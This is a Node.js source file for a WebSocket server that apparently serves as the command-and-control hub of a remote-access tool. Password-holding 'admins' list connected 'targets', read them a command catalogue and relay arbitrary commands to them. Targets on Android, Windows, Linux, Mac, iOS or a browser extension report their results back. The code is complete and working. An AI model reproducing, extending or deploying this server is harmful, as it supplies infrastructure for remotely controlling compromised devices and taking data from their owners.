const websocket = require("ws");
const path = require("path");
const cmds = require("../commands.json")

require('dotenv').config({ path: path.resolve(__dirname, '../.env') }); // Load environment variables from .env file

//storage
const admins = {}
const targets = {}

///match password hash
function matchPassword(pass){return (pass === process.env.PASS)?true:false} //return true if password is correct else false

//send notification to all admins available
function notifyAdmin(con,user,data){Object.keys(admins).map(key=>admins[key].socket.send(JSON.stringify({type:"nt",con:con,user:user,dat:data?data:"no value"})))};

//get the targets list
function getTargetList(){
    return Object.entries(targets).map(([key,value])=>{
        return {username:key,os:value.os}
    })
}

//on message event
function handleMessages(data,url,socket){
    let response;
    data = data.toString()
    try{response = JSON.parse(data)}catch(error){response = false}
    if(response && typeof response === 'object' && response.hasOwnProperty('type')){
        if(url.admin===true && matchPassword(url.password)===true){
            if(response.type ==="tgt"){
                //send target list
                socket.send(JSON.stringify({type:"tgt",data:getTargetList()}))
            }
            if(response.type==="cmd"){
                socket.send(JSON.stringify({type:"cmd",data:cmds}))
            }
            else if(response.type ==="req" && response.to !=undefined && response.data !=undefined){
                try{
                    //if target exists , send data to target
                    targets[response.to].socket.send(`${response.data}|${url.username}`)
                }catch(e){
                    //if target doesnt exists , reply "no target" to admin
                    socket.send(JSON.stringify({type:"err",data:"no target"}))  
                }
            }
            else{
                socket.send(JSON.stringify({type:"err",data:"Unknown cmd"}))
            }
        }
        if(url.admin===false){
            if(response.type ==="res" && response.to !=undefined && response.data !=undefined){
                try{
                    //if admin exists , send data to admin
                    admins[response.to].socket.send(JSON.stringify({type:"res",from:url.username,data:response.data}))
                }catch(e){}
            }
        }
    }else{
        socket.send(JSON.stringify({type:"err",data:"Unknown cmd"}))
    }
}

//on close event
function handleCloseEvent(url){
    try{
        const isTarget = targets[url.username].os;
        if(isTarget){
            delete targets[url.username];
            notifyAdmin(false,url.username);//notifi admin
            console.log("target deleted length "+Object.keys(admins).length);
        }
    }catch(e){
        try{
            delete admins[url.username];
            console.log("admin deleted length "+Object.keys(admins).length);
        }catch(e){}
    } 
}



function handleConnection(socket,request){
    let url;
    //check if url values are able to jsonParse
    try{url = JSON.parse(decodeURIComponent(request.url.replace('/','')))}catch(error){url = null};

    function addToAdminOrTarget(){
                const supportedOS =["android","windows","extension","linux","mac","ios"];
                if(url!=null){
                    const isValidUsername = url.username?true:false;
                    const isValidOs = url.os?true:false;
                    const isValidPassword = url.password?true:false;
                    const isAdmin = url.admin===true?true:false;
                    const bytesize = new TextEncoder().encode(request.url).length;

                    //valid url requirements : bytesize <200 , max keys in url 5 , username is valid , and os match any  os specified
                    if(typeof url.admin ==="boolean" && isAdmin && isValidPassword && matchPassword(url.password) &&isValidUsername && Object.keys(url).length<5 && bytesize<200 ){     
                        admins[url.username] = {socket:socket};
                        console.log(`Admin added ${url.username} total admins : ${Object.keys(admins).length} bytesize : ${bytesize}`);
                    }
                    else if(typeof url.admin ==="boolean" && isAdmin===false && !isValidPassword && isValidUsername && isValidOs && Object.keys(url).length<4 && bytesize<120 && supportedOS.includes(url.os) ){
                        targets[url.username] = {socket:socket,os:url.os,time:new Date().getTime()};
                        notifyAdmin(true,url.username);//notifi admin
                        console.log(`Target added ${url.username} ${url.os} total targets : ${Object.keys(targets).length} bytesize : ${bytesize}`);
                    }
                    else{
                        socket.close();
                    }
                }else{
                    socket.close();
                }
    }
    //adds connection to admin or targets
    addToAdminOrTarget();

    //manage socket messages
    socket.on('message',message=>handleMessages(message,url,socket)); //handle messages

    //manage socket close
    socket.on('close',()=>handleCloseEvent(url)); //handle socket close event  
    
}

//socket server
const websocketHandler = (server)=>{
    const wss = new websocket.Server({server:server,clientTracking:true,perMessageDeflate:true}); //websocket init
    //events
    wss.on('connection',handleConnection);
}


module.exports = websocketHandler;